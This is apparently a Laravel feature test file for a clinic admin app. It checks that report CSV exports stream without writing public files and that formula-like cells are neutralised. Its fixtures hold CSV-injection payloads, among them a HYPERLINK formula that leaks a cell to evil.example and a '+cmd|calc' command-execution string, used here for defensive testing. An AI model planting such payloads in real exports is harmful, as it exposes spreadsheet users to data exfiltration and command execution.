<?php

namespace Tests\Feature;

use App\Models\Contract;
use App\Models\Patient;
use App\Models\Payment;
use App\Models\User;
use App\Services\ReportService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Tests\TestCase;

class ReportCsvExportTest extends TestCase
{
    use RefreshDatabase;

    private User $admin;

    protected function setUp(): void
    {
        parent::setUp();

        $this->admin = User::factory()->superAdmin()->create();
    }

    private function exportFiles(): array
    {
        return glob(storage_path('app/public/reports/*')) ?: [];
    }

    /**
     * Exports used to be written under the public disk with a guessable name
     * and could be fetched from /storage/reports/ until (or if) they were deleted.
     */
    public function test_exports_are_streamed_without_writing_a_file(): void
    {
        Contract::factory()->create();
        $before = $this->exportFiles();

        $first = $this->actingAs($this->admin)->post('/admin/reports/export', ['report_type' => 'contracts']);
        $second = $this->actingAs($this->admin)->get('/admin/reports/contracts?export=1');

        foreach ([$first, $second] as $response) {
            $response->assertOk();
            $this->assertInstanceOf(StreamedResponse::class, $response->baseResponse);
            $this->assertStringContainsString('attachment; filename=contracts_report_', $response->headers->get('content-disposition'));
            $this->assertStringContainsString('Contract Number', $response->streamedContent());
        }

        $this->assertSame($before, $this->exportFiles());
    }

    public function test_text_cells_that_would_run_as_formulas_are_neutralised(): void
    {
        $patient = Patient::factory()->create([
            'name' => '=HYPERLINK("https://evil.example/?d="&C2,"Click")',
            'emergency_contact_name' => '@SUM(A1)',
        ]);
        $contract = Contract::factory()->create(['patient_id' => $patient->id, 'amount' => 2500]);
        Payment::factory()->create([
            'contract_id' => $contract->id,
            'amount' => 1234.5,
            'reference' => '+cmd|calc',
            'notes' => '-2+3',
        ]);

        $csv = $this->actingAs($this->admin)->get('/admin/reports/revenue?export=1')->streamedContent();

        $this->assertStringContainsString("\"'=HYPERLINK(", $csv);
        $this->assertStringContainsString("'+cmd|calc", $csv);
        $this->assertStringContainsString("'-2+3", $csv);
        $this->assertStringNotContainsString('"=HYPERLINK', $csv);
        // Money stays a plain number
        $this->assertStringContainsString(',1234.5,', $csv);

        $patients = $this->actingAs($this->admin)->get('/admin/reports/patients?export=1')->streamedContent();
        $this->assertStringContainsString("'@SUM(A1)", $patients);
        $this->assertStringContainsString(',2500,', $patients);
    }

    public function test_csv_cell_only_touches_risky_strings(): void
    {
        $reports = app(ReportService::class);

        $this->assertSame("'=1+1", $reports->csvCell('=1+1'));
        $this->assertSame("'\tx", $reports->csvCell("\tx"));
        $this->assertSame("'\rx", $reports->csvCell("\rx"));
        $this->assertSame('Asha K', $reports->csvCell('Asha K'));
        $this->assertSame('', $reports->csvCell(''));
        $this->assertSame(-250.0, $reports->csvCell(-250.0));
        $this->assertSame(3, $reports->csvCell(3));
        $this->assertNull($reports->csvCell(null));
    }
}
